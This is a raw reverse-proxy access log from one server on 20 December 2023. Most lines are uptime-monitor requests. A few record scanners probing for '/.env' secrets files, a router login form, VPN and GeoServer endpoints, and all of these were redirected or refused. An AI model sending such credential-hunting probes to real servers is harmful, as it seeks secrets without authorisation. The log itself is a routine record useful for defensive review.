159.203.109.206 - - [20/Dec/2023:09:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1125 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1126 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1127 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1128 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1129 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1130 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1131 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1132 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1133 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1134 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1135 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1136 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:09:21:45 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1137 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:09:21:46 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1138 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1139 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1140 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1141 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1142 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1143 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1144 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1145 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1146 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1147 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1148 "www@docker" "http://172.20.0.9:80" 1ms
45.79.168.172 - - [20/Dec/2023:09:26:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1149 "-" "-" 0ms
172.104.11.46 - - [20/Dec/2023:09:27:07 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1150 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1151 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1152 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1153 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1154 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1155 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1156 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1157 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1158 "www@docker" "http://172.20.0.9:80" 1ms
167.94.138.49 - - [20/Dec/2023:09:30:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1159 "-" "-" 0ms
167.94.138.49 - - [20/Dec/2023:09:30:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1160 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1161 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1162 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1163 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1164 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1165 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1166 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1167 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1168 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1169 "www@docker" "http://172.20.0.9:80" 0ms
45.33.87.154 - - [20/Dec/2023:09:35:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1170 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:09:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1171 "www@docker" "http://172.20.0.9:80" 1ms
45.33.80.243 - - [20/Dec/2023:09:35:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1172 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1173 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1174 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1175 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1176 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1177 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1178 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1179 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1180 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1181 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1182 "www@docker" "http://172.20.0.9:80" 0ms
192.241.226.26 - - [20/Dec/2023:09:40:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1183 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1184 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1185 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1186 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1187 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1188 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1189 "www@docker" "http://172.20.0.9:80" 0ms
54.36.115.221 - - [20/Dec/2023:09:44:18 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1190 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:09:44:18 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1191 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1192 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1193 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1194 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1195 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1196 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1197 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1198 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1199 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1200 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1201 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1202 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1203 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1204 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1205 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1206 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1207 "www@docker" "http://172.20.0.9:80" 0ms
103.67.163.20 - - [20/Dec/2023:09:52:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 1208 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1209 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1210 "www@docker" "http://172.20.0.9:80" 0ms
192.155.88.231 - - [20/Dec/2023:09:52:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1211 "-" "-" 0ms
45.33.80.243 - - [20/Dec/2023:09:53:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1212 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:09:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1213 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1214 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1215 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1216 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1217 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1218 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1219 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1220 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1221 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:09:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1222 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:09:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1223 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:09:58:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1224 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:09:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1225 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:09:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1226 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:09:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1227 "www@docker" "http://172.20.0.9:80" 0ms
74.50.80.82 - - [20/Dec/2023:09:59:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1228 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1229 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1230 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1231 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1232 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1233 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1234 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1235 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1236 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1237 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1238 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1239 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1240 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1241 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1242 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1243 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1244 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:10:07:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1245 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1246 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1247 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1248 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1249 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1250 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1251 "www@docker" "http://172.20.0.9:80" 1ms
45.79.163.53 - - [20/Dec/2023:10:10:53 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1252 "-" "-" 0ms
172.105.128.13 - - [20/Dec/2023:10:11:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1253 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1254 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1255 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1256 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1257 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1258 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1259 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1260 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1261 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1262 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1263 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.4 - - [20/Dec/2023:10:15:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1264 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1265 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1266 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1267 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1268 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1269 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1270 "www@docker" "http://172.20.0.9:80" 0ms
209.145.60.172 - - [20/Dec/2023:10:19:15 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 1271 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1272 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1273 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1274 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1275 "www@docker" "http://172.20.0.9:80" 0ms
162.216.150.88 - - [20/Dec/2023:10:20:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1276 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1277 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1278 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1279 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1280 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1281 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1282 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1283 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1284 "www@docker" "http://172.20.0.9:80" 1ms
74.82.47.4 - - [20/Dec/2023:10:25:08 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1285 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1286 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1287 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1288 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.4 - - [20/Dec/2023:10:26:33 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1289 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:10:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1290 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.4 - - [20/Dec/2023:10:27:19 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1291 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1292 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1293 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1294 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1295 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1296 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1297 "www@docker" "http://172.20.0.9:80" 1ms
74.82.47.4 - - [20/Dec/2023:10:29:38 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1298 "-" "-" 0ms
74.82.47.4 - - [20/Dec/2023:10:30:02 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1299 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1300 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1301 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.4 - - [20/Dec/2023:10:31:15 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1302 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:10:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1303 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1304 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1305 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:10:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1306 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:10:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1307 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:10:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1308 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:10:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1309 "www@docker" "http://172.20.0.9:80" 0ms
